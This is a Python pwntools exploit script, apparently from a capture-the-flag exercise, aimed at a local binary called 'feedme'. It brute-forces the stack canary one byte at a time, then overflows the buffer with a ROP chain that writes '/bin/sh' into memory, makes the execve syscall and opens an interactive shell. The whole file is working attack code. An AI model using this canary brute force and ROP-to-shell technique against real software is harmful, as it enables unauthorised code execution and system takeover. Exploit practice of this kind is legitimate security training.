from pwn import *

target = process('./feedme')

def breakCanary():
    known_canary = b"\x00"
    hex_canary = "00"
    canary = 0x0
    inp_bytes = 0x22
    for j in range(0,3):
        for i in range(0xff):
            log.info("Trying canary: " + hex(canary) + hex_canary)
            target.send(inp_bytes.to_bytes(1, byteorder="little") + b"0"*0x20 + known_canary + canary.to_bytes(1, byteorder="little"))
            output = target.recvuntil(b'exit.\n')
            if b"YUM" in output:
                print(f"next byte is: {hex(canary)}")
                known_canary = known_canary + canary.to_bytes(1, byteorder="little")
                inp_bytes = inp_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace("0x", "")
                if canary > 0xf:
                    hex_canary = new_canary + hex_canary
                else:
                    hex_canary = "0" + new_canary + hex_canary
                canary = 0x0
                break
            else:
                canary = canary + 0x1

    return int(hex_canary, 16)

#gdb.attach(target)

canary = breakCanary()
log.info("The canary is: " + hex(canary))

payload = b"0"*0x20 + p32(canary)

payload += b"1"*0xc

payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928)    # bss address
payload += p32(0x0806f34a)    # pop edx
payload    += p32(0x6e69622f)    # /bin string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
payload += p32(0x0806f34a)    # pop edx
payload += p32(0x0068732f)    # /sh string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0xb)            # 11
payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
payload += p32(0x0)            # 0x0
payload += p32(0x80eb928)    # bss address
payload += p32(0x0806f34a)    # pop edx ; ret
payload += p32(0x0)            # 0x0
payload += p32(0x8049761)    # syscall

# Send the amount of bytes for our payload, and the payload itself
target.send(b"\x78")
target.send(payload)

target.interactive()